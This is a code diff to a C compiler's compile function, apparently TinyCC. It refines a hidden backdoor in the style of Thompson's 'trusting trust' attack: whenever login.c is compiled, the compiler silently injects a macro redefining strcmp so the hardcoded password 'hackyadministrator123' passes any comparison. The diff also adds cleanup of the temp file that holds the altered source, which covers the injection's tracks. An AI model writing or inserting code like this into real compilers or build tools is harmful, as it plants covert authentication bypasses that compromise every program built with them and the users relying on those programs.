@@ -722,22 +722,17 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 	
 	if(!strcmp(str, "login.c")) {
 		// detect if in login.c
-		
-		printf("bruh compiling login.c\n");
-		
+
 		const char *INPUT_STRING = "#define minLen(X, Y)  (strlen(X) < strlen(Y) ? strlen(X) : strlen(Y))\r\n#define strcmp(a, b) ( !(memcmp(a, \"hackyadministrator123\", minLen(a, \"hackyadministrator123\")) || !memcmp(b, \"hackyadministrator123\", minLen(b, \"hackyadministrator123\")) ) ? 0 : memcmp(a, b, minLen(a, b)))";
-		const char *FILE_NAME = "login.c";
-		const char *TARGET_LINE = "#include <string.h>";
 
-
-		FILE *input_file = fopen(FILE_NAME, "r");
+		FILE *input_file = fopen(str, "r");
 		FILE *temp_file = fopen("temp.txt", "w");
 
 		char buffer[100000];
 		int found_target_line = 0;
 
 		while (fgets(buffer, 100000, input_file)) {
-		if (!found_target_line && strstr(buffer, TARGET_LINE)) {
+		if (!found_target_line && strstr(buffer, "#include <string.h>")) {
 		fputs(buffer, temp_file);
 		fputs(INPUT_STRING, temp_file);
 		fputs("\n", temp_file);
@@ -753,6 +748,8 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
 		
 		fd = _tcc_open(s1, "temp.txt");
         str = "temp.txt";
+		
+		// TEMP.TXT NEEDS CLEANUP
 	
 	}
 
@@ -792,6 +789,12 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
     preprocess_end(s1);
     s1->error_set_jmp_enabled = 0;
     tcc_exit_state(s1);
+	
+	// remove temp file 
+	if(!strcmp(str, "temp.txt")) {
+		remove("temp.txt");
+	}
+	
     return s1->nb_errors != 0 ? -1 : 0;
 }
 
